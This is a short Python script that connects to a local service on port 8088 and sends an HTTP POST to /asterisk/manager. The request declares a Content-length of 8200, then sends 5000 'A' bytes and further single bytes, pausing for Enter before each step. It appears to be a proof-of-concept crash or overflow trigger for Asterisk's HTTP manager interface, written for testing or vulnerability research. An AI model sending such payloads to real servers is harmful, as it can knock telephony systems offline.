#!/usr/bin/python

import socket
import sys

arr = []
s = None
#for i in range(100):
#  s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#  s.connect( ("localhost", 8088) )
#  arr.append(s)
#raw_input("exit")

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
raw_input("Press Enter to connect.. ")
s.connect( ("localhost", 8088) )

#header = ("POST /asterisk/manager HTTP/1.0\r\n"+
#          "Host: localhost\r\n"+
#          "Content-length: 2048\r\n"+
#          "\r\n")
#raw_input("Press Enter to send header .. ")
#s.send(header)

raw_input("Press Enter to send header:POST.. ")
h1 = "POST /asterisk/manager HTTP/1.0\r\n"
s.send(h1)
raw_input("Press Enter to send header:Host.. ")
h2 = "Host: localhost\r\n"
s.send(h2)
raw_input("Press Enter to send header:Content-length.. ")
#h3 = "Content-length: 2048\r\n"
#h3 = "Content-length: 8192\r\n"
h3 = "Content-length: 8200\r\n"
s.send(h3)
raw_input("Press Enter to send header:<newline>.. ")
h4 = "\r\n"
s.send(h4)

raw_input("Press Enter to send data:A*5000.. ")
s.send("A"*5000)

raw_input("Press Enter to send data:A.. ")
s.send("A")

raw_input("Press Enter to send data:A.. ")
s.send("A")

raw_input("Press Enter to send data:A.. ")
s.send("A")

raw_input("Press Enter to send data:A.. ")
s.send("A")

raw_input("Press Enter to send data:A.. ")
s.send("A")

raw_input("Press Enter to send data:A.. ")
s.send("A")

raw_input("Press Enter to send data:A.. ")
s.send("A")

raw_input("Press Enter to send data:A.. ")
s.send("A")

raw_input("Press Enter to send datA: <newline\\n>...")
s.send("\n")

raw_input("Press Enter to send data:A.. ")
s.send("A")

raw_input("Press Enter to send datA: <newline\\r\\n>...")
s.send("\r\n")

raw_input("Press Enter to quit..")
